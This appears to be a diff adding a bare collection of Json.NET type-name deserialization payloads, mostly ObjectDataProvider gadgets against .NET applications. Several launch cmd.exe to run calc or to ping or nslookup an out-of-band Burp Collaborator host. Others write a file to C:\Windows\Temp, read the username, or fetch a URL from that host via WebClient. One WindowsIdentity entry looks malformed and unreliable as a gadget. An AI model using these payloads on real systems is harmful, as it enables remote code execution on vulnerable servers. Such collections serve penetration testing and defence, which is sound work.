@@ -145,6 +145,187 @@ From here ----------
 
 
 
+14814777777777777777777777777777777
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib",
+      "$values": [
+        "cmd",
+        "/c ping 2119g5dnzt7pqqhin2co03svlmrff53u.oastify.com"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System"
+    }
+  }
+]
 
 
 
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib",
+      "$values": [
+        "calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System"
+    }
+  }
+]
+
+
+
+
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "WriteAllText",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib",
+      "$values": [
+        "C:\\Windows\\Temp\\poc.txt",
+        "POC triggered via JSON deserialization!"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.IO.File, mscorlib"
+    }
+  }
+]
+
+
+
+
+
+
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "Concat",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib",
+      "$values": [
+        "Environment Username: ",
+        {
+          "$type": "System.Environment, mscorlib",
+          "UserName": ""
+        }
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.String, mscorlib"
+    }
+  }
+]
+
+
+
+
+
+
+
+
+[
+  {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+          "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+          "$values": ["cmd", "/c calc.exe"]
+        },
+        "ObjectInstance": {
+          "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+      }
+    ]
+  }
+]
+
+
+
+
+[
+  {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+          "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+          "$values": ["cmd", "/c nslookup 2119g5dnzt7pqqhin2co03svlmrff53u.oastify.com"]
+        },
+        "ObjectInstance": {
+          "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+      }
+    ]
+  }
+]
+
+
+
+
+
+[
+  {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      {
+        "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "ImpersonationLevel": {
+          "$type": "System.Security.Principal.TokenImpersonationLevel, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+          "value__": 4
+        },
+        "Token": {
+          "$type": "System.IntPtr, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+          "value": 0
+        },
+        "Name": {
+          "$type": "System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+          "$value": "echo pwned > C:\\Windows\\Temp\\pwned.txt"
+        }
+      }
+    ]
+  }
+]
+
+
+
+
+[
+  {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      {
+        "$type": "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.VisualStudio.Text.Data, Version=14.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
+        "ForegroundBrush": {
+          "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+          "MethodName": "DownloadString",
+          "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": ["http://2119g5dnzt7pqqhin2co03svlmrff53u.oastify.com"]
+          },
+          "ObjectInstance": {
+            "$type": "System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+          }
+        }
+      }
+    ]
+  }
+]
